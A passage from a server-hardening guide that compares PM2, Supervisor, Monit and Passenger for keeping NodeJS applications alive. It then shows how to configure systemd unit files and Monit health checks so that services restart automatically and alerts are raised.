After working through the offered features, I struggled to find value in features that were not already offered natively as part of the GNU/Linux Operation System.

PM2 has [Start-up Script Generation](https://github.com/Unitech/PM2/blob/master/ADVANCED_README.md#startup-script), which sounds great, but if using systemd as we do below, then it is just a few lines of config for [our unit file](#vps-countermeasures-lack-of-visibility-proactive-monitoring-keep-nodejs-application-alive). This is a similar process no matter what init system you have out of the box.

**Documentation**

The documentation is nice eye candy, which I think helps to sell PM2.

PM2 has what they call an Advanced [Readme](https://github.com/Unitech/PM2/blob/master/ADVANCED_README.md) which at the time of reviewing, didn't appear to be very advanced, and had a large collection of broken links.

**Does it Meet Our Goals**

1. The feature exists, unsure of how reliable it is currently though. I personally prefer to [create my own](#vps-countermeasures-lack-of-visibility-proactive-monitoring-keep-nodejs-application-alive) and test that it is being used by the operating system's native init system, that is, the same system that starts everything else at boot time. There is nothing more reliable than this.
2. The application restarts if it dies, so no problem there. PM2 can also restart your application if it reaches a certain memory or CPU threshold. I have not seen anything specific to restarting based on response times, or other application health issues though.
3. PM2 provides no file integrity or timestamp checking, so there is nothing stopping your application files being swapped for trojanised counterfeits with PM2
4. Ability to add the following later without having to swap the chosen offering:
    1. Reverse proxy: No problem
    2. [Clustering](http://pm2.keymetrics.io/docs/usage/cluster-mode/) and [load-balancing](https://github.com/Unitech/pm2#load-balancing--zero-second-downtime-reload) is integrated.
    3. PM2 can provide a small collection of viewable statistics, nothing that can not be easily seen by native tooling though. It also offers KeyMetrics integration, except you have to sign up and [pay $29 per host per month](https://keymetrics.io/pricing/) for it. Personally, I would rather pay $0 for something with more features that is way more mature and also native to the operating system. You will see this with [Monit](https://mmonit.com/monit/) soon.
5. There is reasonable official documentation for the age of the project. The community supplied documentation has caught up. After working through all of the offerings and edge cases, I feel as I usually do with NodeJS projects. The documentation does not cover all the edge cases and the development itself also covers few edge cases.
6. I have not seen much that would make me think PM2 is production ready. It may work well, but I do not see much thought in terms of security going into this project. It did not wow me.

**Overall Thoughts**

The architecture does not seem to be heading in the right direction to be used on a production, Internet-facing web server, where less is better. Unless the functionality provided is truly unique and adds more value than the extra attack surface area removes. I would like to see this change, but I do not think it will, the culture is established.

A> The following are better suited to monitoring and managing your applications. Other than [Passenger](#vps-countermeasures-lack-of-visibility-proactive-monitoring-passenger), they should all be in your repositories, which means trivial installs and configurations.

##### [Supervisor](https://github.com/Supervisor/supervisor) {#vps-countermeasures-lack-of-visibility-proactive-monitoring-supervisor}

Supervisor is a process manager with lots of features, and a higher level of abstraction than the likes of the above mentioned [Sysvinit, upstart, systemd, Runit](#vps-countermeasures-lack-of-visibility-proactive-monitoring-sysvinit-upstart-systemd-runit), etc. It still needs to be run by an init daemon however.

From the [docs](http://supervisord.org/#supervisor-a-process-control-system): “_It shares some of the same goals of programs such as [launchd, daemontools, and runit](http://supervisord.org/glossary.html#term-daemontools). Unlike some of these programs, it is not meant to be run as a substitute for init as “process id 1”. Instead it is meant to be used to control processes related to a project or a customer, and is meant to start like any other program at boot time._” Supervisor monitors the [state](http://supervisord.org/subprocess.html#process-states) of processes. Where as a tool like [Monit](https://mmonit.com/monit/#about) can perform so many more types of tests and take what ever actions you define.

Supervisor is in the Debian [repositories](https://packages.debian.org/stretch/supervisor) and is a trivial install on Debian and derivatives.

**Documentation**

[Main web site](http://supervisord.org/) (ReadTheDocs)

**Does it Meet Our Goals**

1. Application should start automatically on system boot: Yes, this is what Supervisor does well.
2. Application will be restarted if it dies, or becomes unresponsive. It is often difficult to get accurate up/down status on processes on UNIX. Pid-files often lie. Supervisord starts processes as subprocesses, so it always knows the true up/down status of its children. Your application may become unresponsive or can not connect to its database, or any other service/resource it needs to work as expected. To be able to monitor these events and respond accordingly your application can expose a health check interface, such as `GET /healthcheck`. If everything goes well it should return `HTTP 200`, if not then `HTTP 5**` In some cases the restart of the process will solve this issue. [`httpok`](https://superlance.readthedocs.io/en/latest/httpok.html) is a Supervisor event listener which makes `GET` requests to the configured URL. If the check fails or times out, `httpok` will restart the process. To enable `httpok` the [following lines](https://blog.risingstack.com/operating-node-in-production/#isitresponding) must be placed in `supervisord.conf`:  
  
  {linenos=off, lang=bash}
      [eventlistener:httpok]
      command=httpok -p my-api http://localhost:3000/healthcheck  
      events=TICK_5  
  
3. The person responsible for the application should know if a troganised version of the application is swapped in, or if file timestamps have changed. This is not one of Supervisor's capabilities.
4. Ability to add the following later without having to swap the chosen offering:
    1. Reverse proxy: No problem
    2. Integrate NodeJS's core module [cluster](https://nodejs.org/api/cluster.html) into your NodeJS application for load balancing. This would be completely separate to Supervisor.
    3. Visibility to application statistics could be added later with the likes of Monit or something else. For me, Supervisor does not do enough. Monit does. If you need what Monit offers, then you have three packages to think about, or something like Supervisor, which is not an init system, so it kind of sits in the middle of the stack. My preference is to use the init system already available to do the low level lifting, and then something small to take care of everything else on your server that the init system is not really designed for. Monit does this job really well. Keep in mind, this is not based on bias. I had not used Monit before this exercise. It has been a couple of years since a lot of this was written though, and Monit has had a home in my security focused hosting facility since then. I never look at it or touch it, Monit just lets me know when there are issues, and is quiet the rest of the time.
5. Supervisor is a mature product. It has been around since 2004 and is still actively developed. The official and community provided [docs](https://serversforhackers.com/monitoring-processes-with-supervisord) are good.
6. Yes it is production ready, it has proven itself.

**Overall Thoughts**

The documentation is quite good, it's easy to read and understand. I felt that the config was quite intuitive as well. I already had systemd installed and did not see much point in installing Supervisor as systemd appeared to do everything Supervisor could do, plus systemd is an init system, sitting at the bottom of the stack. In most scenarios you are going to have a Sysvinit or replacement (that runs with a `PID` of `1`). In many cases, Supervisor while quite nice, is kind of redundant.

Supervisor is better suited to running multiple scripts with the same runtime, for example, a bunch of different client applications running on Node. This can be done with systemd and others, but Supervisor is a better fit for this sort of thing. PM2 also looks to do a good job of running multiple scripts with the same runtime.

##### [Monit](https://mmonit.com/monit/) {#vps-countermeasures-lack-of-visibility-proactive-monitoring-monit}

Monit is a utility for monitoring and managing daemons or similar programs. It is mature, actively maintained, free, open source, and licensed with GNU [AGPL](http://www.gnu.org/licenses/agpl.html).

It is in the Debian [repositories](https://packages.debian.org/stretch/monit) (trivial install on Debian and derivatives). The home page told me the binary was just under 500kB. The install however produced a different number:

{linenos=off, lang=bash}
    After this operation, 765 kB of additional disk space will be used.

Monit provides an impressive feature set for such a small package.

Monit provides far more visibility into the state of your application and control than any of the offerings mentioned above. It is also generic. It will manage and/or monitor anything you throw at it. It has the right level of abstraction. Often, when you start working with a product you find its limitations, and they stop you moving forward. You end up settling for imperfection or you swap the offering for something else providing you have not already invested too much effort into it. For me, Monit hit the sweet spot, and never seems to stop you in your tracks. There always seems to be an easy way to get any "monitoring -> take action" sort of task done. I also really like that moving away from Monit would be relatively painless, other than miss its capabilities. The time investment and learning curve are very small, and some of it will be transferable in many cases, you need only config from the control file.

{#vps-countermeasures-lack-of-visibility-proactive-monitoring-monit-features-that-stand-out}
**[Features that Stand Out](https://mmonit.com/monit/#about)**

* Ability to [monitor](http://slides.com/tildeslash/monit#/1) files, [directories](http://slides.com/tildeslash/monit#/23), disks, processes, [programs](http://slides.com/tildeslash/monit#/26), the system, and other hosts.
* Can perform [emergency logrotates](http://slides.com/tildeslash/monit#/21) if a log file suddenly grows too large too fast
* [File Checksum Testing](http://mmonit.com/monit/documentation/monit.html#FILE-CHECKSUM-TESTING). [This](http://slides.com/tildeslash/monit#/22) is good so long as the compromised server has not also had the tool you're using to perform your verification (md5sum or sha1sum) modified, whether using the system's utilities or Monit-provided utilities. In cases like this, tools such as [Stealth](#vps-countermeasures-lack-of-visibility-host-intrusion-detection-systems-hids-deeper-with-stealth) can be a good choice to protect your monitoring tools.
* Testing of other attributes such as ownership and access permissions. These are good, but again can be [easily modified](#vps-identify-risks-lack-of-visibility).
* Monitoring [directories](http://slides.com/tildeslash/monit#/23) using timestamps. Good idea, but do not rely solely on this. Timestamps are easily modified with `touch -r`, providing you do it between Monit's cycles. You may not necessarily know when they are, unless you have permissions to look at Monit's control file. This provides defence in depth though.
* Monitoring [space of file systems](http://slides.com/tildeslash/monit#/24)
* Has a built-in lightweight HTTP(S) interface you can use to browse the Monit server, and check the status of all monitored services. From the web interface you can start, stop, and restart processes and disable or enable monitoring of services. Monit provides [fine grained control](https://mmonit.com/monit/documentation/monit.html#MONIT-HTTPD) over who/what can access the web interface, or whether it is even active or not. Again an excellent feature that you can choose to use or not depending on your attack surface preferences.
* There is also an aggregator ([m/monit](https://mmonit.com/)) that allows system administrators to monitor and manage many hosts at a time. It also works well on mobile devices and is available at a reasonable price to monitor all hosts.
* Once you install Monit you have to actively enable the HTTP daemon in the `monitrc` in order to run the Monit cli and/or access the Monit HTTP web UI. At first I thought this was broken as I could not even run `monit status` (a Monit command). PS told me Monit was running, then I realised **it is secure by default**. You have to consciously expose anything. This is what confirmed that Monit was one of the tools for me.
* The [Control File](http://mmonit.com/monit/documentation/monit.html#THE-MONIT-CONTROL-FILE)
* Security by default. Just [like SSH](#vps-countermeasures-disable-remove-services-harden-what-is-left-ssh-key-pair-authentication-ssh-perms), to protect the security of your control file and passwords, the control file must have read-write permissions no more than `0700 (`u=xrw,g=,o=`); Monit will complain and exit otherwise, again, security by default.

**Documentation**

The following was the documentation I used in the same order and I found it the most helpful.

1. [Main web site](https://mmonit.com/monit/)
2. Clean and concise [Official Documentation](https://mmonit.com/monit/documentation/monit.html) all on the one page with hyperlinks
3. Source and links to other [documentation](https://bitbucket.org/tildeslash/monit/src), including a QUICK START guide of about six lines
4. [Adding Monit to systemd](https://mmonit.com/wiki/Monit/Systemd)
5. [Release notes](https://mmonit.com/monit/changes/)
6. The monit control file itself has excellent documentation in the form of commented examples. Just uncomment and modify to suite your use case.

**Does it Meet Our Goals**

1. Application can start automatically on system boot
2. Monit has a plethora of different types of tests it can perform and then follow up with actions based on the outcomes. [HTTP](http://mmonit.com/monit/documentation/monit.html#HTTP) is but one of them.
3. Monit covers this nicely, you still need to integrity check Monit though.
4. Ability to add the following later without having to swap the chosen offering:
    1. Reverse proxy: No issues here
    2. Integrate NodeJS's core module [cluster](https://nodejs.org/api/cluster.html) into your NodeJS application for load balancing. Monit will still monitor, restart, and do what ever else you tell it to do.
    3. Monit provides application statistics to look at, if that is what you want, but it also goes further and provides directives for you to declare behaviour based on conditions that Monit checks for and can execute.
5. Plenty of official and community supplied documentation
6. Yes, it is production ready, has been for many years, and is still very actively maintained. It has proven itself. Some extra education specific to the [points](#vps-countermeasures-lack-of-visibility-proactive-monitoring-monit-features-that-stand-out) I raised above with some of the security features would be good.

**Overall Thoughts**

There was an accepted answer on [Stack Overflow](http://stackoverflow.com/questions/7259232/how-to-deploy-node-js-in-cloud-for-high-availability-using-multi-core-reverse-p) that discussed a good mix and approach to using the right tools for each job. Monit has many capabilities, none of which you must use, so it does not get in your way, like other tools do. Also other tools like to dictate how you do things and what you must use in order to do them. I have been using Monit now for several years and just forget that it is there, until it alerts when something is not quite right. Monit allows you to leverage what ever you already have in your stack, it plays very nicely with all other tools. Monit under sells and over delivers. You do not have to install package managers or increase your attack surface other than `[apt-get|aptitude] install monit`. It is easy to configure and has lots of good documentation.

##### Passenger {#vps-countermeasures-lack-of-visibility-proactive-monitoring-passenger}

When I've looked at Passenger in the past it looked quite good, and it still does, with one main caveat: it is trying to do too much. One can easily get lost in the official documentation ([example](http://mmonit.com/wiki/Monit/Installation) of the Monit install (handful of commands to cover all Linux distributions on one page) versus Passenger [install](https://www.phusionpassenger.com/documentation/Users%20guide%20Standalone.html#installation) (many pages to get through)).  “_Passenger is a web server and application server, designed to be fast, robust and lightweight. It runs your web applications with the least amount of hassle by taking care of almost all administrative heavy lifting for you._” I would like to see the actual application weight rather than just a relative term “lightweight”. To me it does not look lightweight. The feeling I got when evaluating Passenger was similar to the feeling produced with my [Ossec evaluation](#vps-countermeasures-lack-of-visibility-host-intrusion-detection-systems-hids-deeper-with-ossec).

The learning curve is quite a bit steeper than all the previous offerings. Passenger makes it hard to use the tools you may want to swap in and out. I am not seeing the [UNIX Philosophy](http://en.wikipedia.org/wiki/Unix_philosophy) here.

If you looked at the Phusion Passenger Philosophy when it was available (it's been removed) you would see some note-worthy comments. “We believe no good software has bad documentation“. If your software is 100% intuitive, the need for documentation should be minimal. Few software products are 100% intuitive, because we only have so much time to develop them. The [comment around](https://github.com/phusion/passenger/wiki/Phusion-Passenger:-Meteor-tutorial#what-passenger-doesnt-do) “the Unix way” is interesting also. At this stage I am not sure this is the Unix way. I would like to spend some time with someone, or some team, that has Passenger in production in a diverse environment and see how things are working out.

Passenger is not in the Debian repositories, so you would need to add the apt repository.

At the time of writing this, Passenger was seven years old, but the NodeJS support was only just over two years old.

**Features that Do Not really Stand Out**

Sadly there were not many that stood out for me.

* The [Handle more traffic](https://www.phusionpassenger.com/handle_more_traffic) marketing material looked similar to [Monit resource testing](http://mmonit.com/monit/documentation/monit.html#RESOURCE-TESTING) but without the detail. If there is one thing Monit doesn't do well, it's letting you know when to use other tools and help you configure them to suit your needs. If you do not like it, swap it out for something else. Passenger seems to integrate into everything, rather than providing tools to communicate loosely, essentially locking you into a way of doing something that hopefully you like. It also talks about using all available CPU cores. If you are using Monit you can use the NodeJS cluster module to take care of that, again, leaving the best tool for the job it does best.
* [Reduce maintenance](https://www.phusionpassenger.com/reduce_maintenance)
  * “**_Keep your app running, even when it crashes_**. _Phusion Passenger supervises your application processes, restarting them when necessary. That way, your application will keep running, ensuring that your website stays up. Because this is automatic and builtin, you do not have to setup separate supervision systems like Monit, saving you time and effort._” But this is what we want, we want a separate supervision (monitoring) system, or at least a very small monitoring daemon, and this is what Monit excels at, and it is so much easier to set-up than Passenger. This sort of marketing does not sit right with me.
  * “**_Host multiple apps at once_**. _Host multiple apps on a single server with minimal effort._” If we are talking NodeJS web apps, then they are their own server. They host themselves. In this case it looks like Passenger is trying to solve a problem that does not exist, at least in regards to NodeJS?
* [Improve security](https://www.phusionpassenger.com/improve_security)
  * “**_Privilege separation_**. _If you host multiple apps on the same system, then you can easily run each app as a different Unix user, thereby separating privileges._“. The Monit [documentation](https://mmonit.com/monit/documentation/monit.html#PROGRAM-STATUS-TESTING) says this: “If Monit is run as the super user, you can optionally run the program as a different user and/or group”, and goes on to provide examples as to how it is done. Again, I do not see anything new here other than the “Slow client protections” which has side effects, that is it for security considerations with Passenger. Monit has security woven through every aspect of itself.
* What I saw happening here, was a lot of stuff that as a security focussed proactive monitoring tool, was not required. Your mileage may vary.

**[Offerings](https://www.phusionpassenger.com/download)**

Phusion Passenger is a commercial product that has enterprise, custom, and open source support which is free and includes many features.

**Documentation**

Following is the documentation I used, in the same order I found to be most helpful.

1. NodeJS [tutorial](https://github.com/phusion/passenger/wiki/Phusion-Passenger%3A-Node.js-tutorial), this got me started with how it could work with NodeJS
2. [Main web site](https://www.phusionpassenger.com/)
3. [Documentation and support portal](https://www.phusionpassenger.com/documentation_and_support)
4. [Design and Architecture](https://www.phusionpassenger.com/documentation/Design%20and%20Architecture.html)
5. [User Guide Index](https://www.phusionpassenger.com/library/)
6. [Nginx specific User Guide](https://www.phusionpassenger.com/documentation/Users%20guide%20Nginx.html)
7. [Standalone User Guide](https://www.phusionpassenger.com/documentation/Users%20guide%20Standalone.html)
8. [Twitter](https://twitter.com/phusion_nl), [blog](https://blog.phusion.nl/)
9. IRC: `#passenger` at `irc.freenode.net`. I was on there for several days. There was very little activity.
10. [Source](https://github.com/phusion/passenger)


**Does it Meet Our Goals?**

1. Application should start automatically on system boot. There is no doubt that Passenger goes way beyond this goal
2. Application should restart if it dies or becomes unresponsive. There is no doubt that Passenger goes way beyond this goal too
3. I have not seen Passenger provide any file integrity or timestamp checking features
4. Ability to add the following later without having to swap the chosen offering:
    1. Reverse proxy: Passenger provides integration with Nginx, Apache and stand-alone (provide your own proxy)
    2. Passenger scales up NodeJS processes and automatically load balances between them
    3. Passenger is advertised as offering easily viewable [statistics](https://www.phusionpassenger.com/identify_and_fix_problems). I have not seen many of them though
5. There is loads of official documentation but not as much community contribution though
6. From what I have seen so far, I would say Passenger may be production-ready. However, I would like to be able to see more specifically how security was baked into the architecture though before I commit to using it in production. I am just not seeing it.

**Overall Thoughts**

I ended up spending quite awhile reading the documentation. I just think it is doing too much. I prefer to have stronger single focused tools that do one job, do it well, and play nicely with all the other kids in the sand pit. You pick the tool, it's simply intuitive how to use it, and you end up just reading docs to confirm how you think it should work. For me, this was not my experience with Passenger.

&nbsp;

A> If you are looking for something even more comprehensive, check out [Zabbix](http://en.wikipedia.org/wiki/Zabbix).  
A> If you like to pay for your tools, check out Nagios, if you have not already.

At this point it was fairly clear as to which components I would like to use to keep my NodeJS application(s) monitored, alive, and healthy, along with any other scripts and processes.

Systemd and Monit.

Going with the default for the init system should give you a quick start and provide plenty of power. Plus, it is well supported, reliable, feature rich, and you can manage anything/everything you want without installing extra packages.

For the next level, I would choose Monit. I have now used it in production, and it has taken care of everything above the init system with a very simple configuration. I feel it has a good level of abstraction, plenty of features, never gets in the way, and integrates nicely with production OS(s) with little to no friction.

##### Getting Started with Monit {#vps-countermeasures-lack-of-visibility-proactive-monitoring-getting-started-with-monit}

We have installed Monit with an `apt-get install monit` and we are ready to start configuring it.

{linenos=off, lang=bash}
    ps aux | grep -i monit

This reveals that Monit is running:

{linenos=off, lang=bash}
    /usr/bin/monit -c /etc/monit/monitrc

The first thing we need to do is make some changes to the control file (`/etc/monit/monitrc` in Debian). The control file has sensible defaults already. At this stage I do not need a web UI accessible via localhost or any other hosts, but it still needs to be turned on and accessible by at least localhost. [Here is why](http://mmonit.com/monit/documentation/monit.html#MONIT-HTTPD):

"_Note that if HTTP support is disabled, the Monit CLI interface will have reduced functionality, as most CLI commands (such as "monit status") need to communicate with the Monit background process via the HTTP interface. We strongly recommend having HTTP support enabled. If security is a concern, bind the HTTP interface to local host only or use Unix Socket so Monit is not accessible from the outside._"

In order to turn on the HTTP daemon, all you need in your control file is:

{linenos=off, lang=bash}
    # only accept connection from localhost
    set httpd port 2812 and use address localhost
    # allow localhost to connect to the server and
    allow localhost

If you want to receive alerts via email, then you will need to [configure it](https://mmonit.com/monit/documentation/monit.html#Setting-a-mail-server-for-alert-delivery). On reload you should get start and stop events (when you quit).

{linenos=off, lang=bash}
    sudo monit reload

Now, if you issue a `curl localhost:2812` you should see the web UI's response with an HTML page. Now you can start to play with the Monit CLI. Monit can also be seen listening in the `netstat` output [above](#vps-countermeasures-disable-remove-services-harden-what-is-left-disable-exim) where we disabled and removed services.

To stop the Monit background process use:

{linenos=off, lang=bash}
    monit quit

You can find all the arguments you can use with Monit in the documentaion under [Arguments](https://mmonit.com/monit/documentation/monit.html#Arguments), or just issue:

{linenos=off, lang=bash}
    monit -h # will list all options.

To check the control file for syntax errors:

{linenos=off, lang=bash}
    sudo monit -t

Also keep an eye on your log file which is specified in the control file:  
`set logfile /var/log/monit.log`

So, what happens when Monit dies?

##### Keep Monit Alive

You're going to want to make sure that your monitoring tool that is configured to take all sorts of actions on your behalf never stops running, leaving you blind. No noise from your servers means all good right? Not necessarily. Your monitoring tool has to keep running, no ifs, ands, or buts about it. Let's make sure of that now.

When Monit is `apt-get install`‘ed on Debian, it is installed and configured to run as a daemon. This is defined in Monit's init script.  
Monit's init script is copied to `/etc/init.d/` and the run levels set up for it upon installation. This means when ever a run level is entered, the init script will be run taking either the single argument of `stop` (example: `/etc/rc0.d/K01monit`), or `start` (example: `/etc/rc2.d/S17monit`). Remember we [discussed run levels](#vps-countermeasures-disable-remove-services-harden-what-is-left-disable-exim) previously?

**systemd to the rescue**

Monit is very stable, but if for some reason it dies, then it will not be [automatically restarted](https://mmonit.com/monit/documentation/monit.html#INIT-SUPPORT) again. In saying that, I have never had Monit die on any of my servers being monitored.  
This is where systemd comes in. systemd is installed automatically on Debian Jessie and later. Ubuntu uses Upstart on 14.10 which is similar, Ubuntu 15.04 uses systemd. Both SysV init and systemd can act as drop-in replacements for each other or even work along side of each other, which is the case in Debian Jessie. If you add a unit file which describes the properties of the process that you want to run, then issue some magic commands, the systemd unit file will then take precedence over the init script (`/etc/init.d/monit`).

Before we get started, let's get some terminology established. The two concepts in systemd we need to know about are unit and target.

1. A unit is a configuration file that describes the properties of the process that you would like to run. There are many examples of these that I can show you, and I will point you in the right direction soon. They should have a `[Unit]` directive at a minimum. The syntax of the unit files and the target files were derived from Microsoft Windows `.ini` files. Now I think the idea is that if you will want to have a `[Service]` directive within your unit file, then you would append `.service` to the end of your unit file name.
2. A target is a grouping mechanism that allows systemd to start up groups of processes at the same time. This happens at every boot as processes are started at different run levels.

Now in Debian there are two places that systemd looks for unit files... In order from lowest to highest precedence, they are as follows:

1. `/lib/systemd/system/` (prefix with `/usr` dir for archlinux) unit files provided by installed packages. Have a look in here for many existing examples of unit files.
2. `/etc/systemd/system/` unit files created by the system administrator.

As mentioned [above](#vps-countermeasures-lack-of-visibility-proactive-monitoring-sysvinit-upstart-systemd-runit-systemd), systemd should be the first process started on your Linux server. systemd reads the different targets and runs the scripts within the specific targets `target.wants` directory (which just contains a collection of symbolic links to the unit files). For example, the target file we will work with is the `multi-user.target` file (we do not actually touch it, systemctl does that for us (as per the magic commands mentioned above)). As systemd has two locations in which it looks for unit files, it is probably the same for the target files. There was not any target files in the system administrator-defined unit location, but there were some `target.wants` files there.

**systemd Monit Unit file**

I found a template that Monit had already provided for a unit file in  
`/usr/share/doc/monit/examples/monit.service`. There is also one for Upstart. Copy that to where the system administrator unit files should go, as mentioned above, and make the change so that systemd restarts Monit if it dies for what ever reason. Check the `Restart=` options on the [systemd.service man page](http://www.dsm.fordham.edu/cgi-bin/man-cgi.pl?topic=systemd.service). The following is what my initial unit file looked like:

{title="/etc/systemd/system/monit.service", linenos=off, lang=bash}
    [Unit]
    Description=Pro-active monitoring utility for unix systems
    After=network.target
     
    [Service]
    Type=simple
    ExecStart=/usr/bin/monit -I -c /etc/monit/monitrc
    ExecStop=/usr/bin/monit -c /etc/monit/monitrc quit
    ExecReload=/usr/bin/monit -c /etc/monit/monitrc reload
    Restart=always
     
    [Install]
    WantedBy=multi-user.target

Now, some explanation. Most of this is pretty obvious. The `After=` directive tells systemd to make sure the `network.target` file has been acted on first. `network.target` has `After=network-pre.target` which does not have a lot in it. I am not going to go into this now, it simply works, the network interfaces have to be up first. If you want to know how or why, check the [systemd NetworkTarget documentation](https://www.freedesktop.org/wiki/Software/systemd/NetworkTarget/). `Type=simple`. Again check the systemd.service man page.
To have systemd control Monit, Monit must not run as a background process (the default). To do this, we can either add the `set init` statement to Monit's control file or add the `-I` option when running systemd, which is exactly what we have done above. The `WantedBy=` is the target that this specific unit is part of.

We need to tell systemd to create the symlinks in the `/etc/systemd/system/multi-user.target.wants` directory. See the [systemctl man page](http://www.dsm.fordham.edu/cgi-bin/man-cgi.pl?topic=systemctl) for more details about what enable actually does if you want them. You will also need to start the unit.

What I like to do here is:

{linenos=off, lang=bash}
    systemctl status /etc/systemd/system/monit.service

Then compare this output once we enable the service:

{linenos=off, lang=bash}
    ● monit.service - Pro-active monitoring utility for unix systems
       Loaded: loaded (/etc/systemd/system/monit.service; disabled)
       Active: inactive (dead)

{linenos=off, lang=bash}
    sudo systemctl enable /etc/systemd/system/monit.service

systemd now knows about monit.service

{linenos=off, lang=bash}
    systemctl status /etc/systemd/system/monit.service

Outputs:

{linenos=off, lang=bash}
    ● monit.service - Pro-active monitoring utility for unix systems
       Loaded: loaded (/etc/systemd/system/monit.service; enabled)
       Active: inactive (dead)

Now start the service:

{linenos=off, lang=bash}
    sudo systemctl start monit.service # there's a stop and restart also.

You can check the `status` of your Monit service again. This shows terse runtime information about the units or PID you specify (monit.service in our case).

{linenos=off, lang=bash}
    sudo systemctl status monit.service

By default this function will show you 10 lines of output. The number of lines can be controlled with the `--lines=` option:

{linenos=off, lang=bash}
    sudo systemctl --lines=20 status monit.service

Now, try `kill`ing the Monit process. At the same time, you can watch the output of Monit in another terminal. [tmux](https://tmux.github.io/) or [screen](https://blog.binarymist.net/2011/11/27/centerim-irssi-alpine-on-screen/#screen) is helpful for this:

{linenos=off, lang=bash}
    sudo tail -f /var/log/monit.log

{linenos=off, lang=bash}
    sudo kill -SIGTERM $(pidof monit)
    # SIGTERM is a safe kill and is the default, so you don't actually need to specify it.
    # Be patient, this may take a minute or two for the Monit process to terminate.

Or you can emulate a nastier termination with `SIGKILL` or even `SEGV` (which may kill Monit faster).

When you run another `status` command you should see the PID has changed. This is because systemd has restarted Monit.

When you need to make modifications to the unit file, you will need to run the following command after save:

{linenos=off, lang=bash}
    sudo systemctl daemon-reload

When you need to make modifications to the running services configuration file  
`/etc/monit/monitrc` for example, you will need to run the following command after save:

{linenos=off, lang=bash}
    sudo systemctl reload monit.service
    # because systemd is now in control of Monit,
    # rather than the before mentioned: sudo monit reload

##### Keep NodeJS Application Alive {#vps-countermeasures-lack-of-visibility-proactive-monitoring-keep-nodejs-application-alive}

Now we know systemd is always going to be running. So let's use it to take care of the primary service control: keeping your NodeJS service alive.

**Using systemd**

**systemd my-nodejs-app Unit file**

You will need to know where your NodeJS binary is. The following will provide the path:

{linenos=off, lang=bash}
    which NodeJS

Now create a systemd unit file `my-nodejs-app.service`

{title="/etc/systemd/system/my-nodejs-app.service", linenos=off, lang=bash}
    [Unit]
    Description=My amazing NodeJS application
    After=network.target
    
    [Service]
    # systemctl start my-nodejs-app # to start the NodeJS script
    ExecStart=[where nodejs binary lives] [where your app.js/index.js lives]
    # systemctl stop my-nodejs-app # to stop the NodeJS script
    # SIGTERM (15) - Termination signal. This is the default and safest way to kill process.
    # SIGKILL (9) - Kill signal.
        # Use SIGKILL as a last resort to kill process.
        # This will not save data or cleaning kill the process.
    ExecStop=/bin/kill -SIGTERM $MAINPID
    # systemctl reload my-nodejs-app # to perform a zero-downtime restart.
    # SIGHUP (1) - Hangup detected on controlling terminal or death of controlling process.
    # Use SIGHUP to reload configuration files and open/close log files.
    ExecReload=/bin/kill -HUP $MAINPID
    Restart=always
    StandardOutput=syslog
    StandardError=syslog
    SyslogIdentifier=my-nodejs-app
    User=my-nodejs-app
    Group=my-nodejs-app # Not really needed unless it's different,
    # as the default group of the user is chosen without this option.
    # Self documenting though, so I like to have it present.
    Environment=NODE_ENV=production
    
    [Install]
    WantedBy=multi-user.target

Add the system user and group so systemd can actually run your service as the user you have specified.

{linenos=off, lang=bash}
    # The following line is not needed if you adduser like below:
    sudo groupadd --system my-nodejs-app
    # To verify which groups exist:
    getent group
    # This will create a system group with the same name and ID of the user:
    sudo adduser --system --no-create-home --group my-nodejs-app
    groups my-nodejs-app # to verify which groups the new user is in.

As we did above, go through the same procedure `enable`ing, `start`ing, and verifying your new service.

Make sure you have your directory permissions set up correctly, you should have a running NodeJS application that, when it dies, will be restarted automatically by systemd.

Do not forget to backup all your new files and changes in case something happens to your server.

We are done with systemd for now. Following are some useful resources that I have used:

* [`kill`ing processes](http://www.cyberciti.biz/faq/kill-process-in-linux-or-terminate-a-process-in-unix-or-linux-systems/)
* [Unix signals](https://en.wikipedia.org/wiki/Unix_signal)
* [Terse guide](https://wiki.archlinux.org/index.php/systemd) of systemd commands and some other quick start sort of info

**Using Monit**

Now configure your Monit control file. You can spend a lot of time here tweaking much more than just your NodeJS application. There are loads of examples, and the control file itself has lots of commented examples as well. You will find the following the most helpful:

* [Official Monit Documentation](https://mmonit.com/monit/documentation/monit.html)
* [Monit Man page](http://linux.die.net/man/1/monit)

There are a few things that had me stuck for awhile. By default, Monit only sends alerts on change (dark cockpit approach), instead of on every cycle if the condition stays the same:

{linenos=off, lang=bash}
    set alert your-email@your.domain

Append `receive all alerts`, so that it looks like this:

{linenos=off, lang=bash}
    set alert your-email@your.domain receive all alerts

There are quite a few things you just work out as you go. The main part I used to health check my NodeJS app was:

{title="Sub-section of /etc/monit/monitrc", linenos=off, lang=bash}
    check host your_server with address your_server
       start program = "/bin/systemctl start my-nodejs-app.service"
       stop program = "/bin/systemctl stop my-nodejs-app.service"
       if failed ping then alert
       if failed
          port 80 and
          protocol http and
          status = 200 # The default without status is failure if status code >= 400
          request /testdir with content = "some text on my web page" and
             then restart
       if 5 restarts within 5 cycles then alert

Carry on and add to, or uncomment, and modify the `monitrc` file, with the likes of:

1. CPU and memory usage
2. Load averages
3. File system space on all the mount points
4. Check SSH such that it has not been restarted by anything other than Monit (potentially swapping the binary or its config). If an attacker kills Monit, or systemd immediately restarts it, we get Monit alert(s). We also get real-time logging, ideally to an [offsite syslog server](#vps-countermeasures-lack-of-visibility-web-server-log-management-initial-set-up). Your offsite syslog server also has alerts set up on particular log events. On top of that, you should also have inactivity alerts set-up so that if your log files are not generating events that you expect, then you also receive alerts. Services such as [Dead Man's Snitch](https://deadmanssnitch.com/), or packages such as [Simple Event Correlator](https://simple-evcorr.github.io/) with Cron are good for this. On top of all that, if you have a file integrity checker that resides on another system that your host reveals no details for, and you've got it configured to check all the correct file checksums, dates, permissions, etc, you are removing much of the low hanging fruit for attackers seeking to compromise your system.
5. Directory permissions, uid, gid and checksums. I believe the tools Monit uses to do these checks are part of Monit.

#### Statistics Graphing {#vps-countermeasures-lack-of-visibility-statistics-graphing}
![](images/ThreatTags/PreventionAVERAGE.png)

This is where [collectd](https://collectd.org/) and [graphite](https://graphiteapp.org/) really shine. Both tools do one thing, do it well, and are independent of each other, but are often used together.

Check the related [Statistics Graphing](#web-applications-countermeasures-lack-of-visibility-insufficient-Monitoring-statistics-graphing) section in the countermeasures section of the Web Applications chapter, where we introduce statsd as the collector for application metrics.

